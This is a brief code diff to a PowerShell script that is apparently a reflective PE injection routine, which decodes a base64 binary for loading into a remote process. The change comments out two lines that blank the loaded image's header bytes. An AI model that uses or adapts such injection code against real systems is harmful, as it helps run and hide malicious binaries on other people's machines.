@@ -2598,8 +2598,8 @@ $RemoteScriptBlock = {
         {
             [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
         }
-        $PEBytes[0] = 0
-        $PEBytes[1] = 0
+        # $PEBytes[0] = 0
+        # $PEBytes[1] = 0
 		$PEHandle = [IntPtr]::Zero
 		if ($RemoteProcHandle -eq [IntPtr]::Zero)
 		{
